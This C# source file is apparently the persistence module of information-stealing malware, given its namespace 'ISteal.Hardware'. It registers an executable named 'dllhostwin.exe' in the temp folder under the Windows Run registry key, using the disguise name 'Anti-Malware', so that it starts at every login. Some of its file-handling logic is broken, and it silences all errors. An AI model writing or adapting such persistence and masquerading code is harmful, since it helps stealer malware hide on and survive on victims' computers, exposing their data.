using System.IO;
using System;
using Microsoft.Win32;
using System.Security;

namespace ISteal.Hardware
{
    internal class Run
    {
        public static void Autorun(string Name = "Anti-Malware", string Key = @"Software\Microsoft\Windows\CurrentVersion\Run")
        {
            string path = Path.GetTempPath() + "\\dllhostwin.exe";

            try
            {
                if (File.Exists(path))
                {
                    File.SetAttributes(path, FileAttributes.Normal);
                    try
                    {
                        File.Delete(path);
                    }
                    catch (Exception) { }
                }
            }
            catch (IOException) { }
            try
            {
                if (!File.Exists(path))
                {
                    File.SetAttributes(path, FileAttributes.Hidden);
                }
            }
            catch (IOException) { }
            try
            {
                using (var registryKey = Registry.CurrentUser.CreateSubKey(Key))
                {
                   registryKey.SetValue(Name, path);
                }
            }
            catch (UnauthorizedAccessException) { }
            catch (IOException) { }
            catch (ArgumentException) { }
            catch (SecurityException) { }
        }
    }
}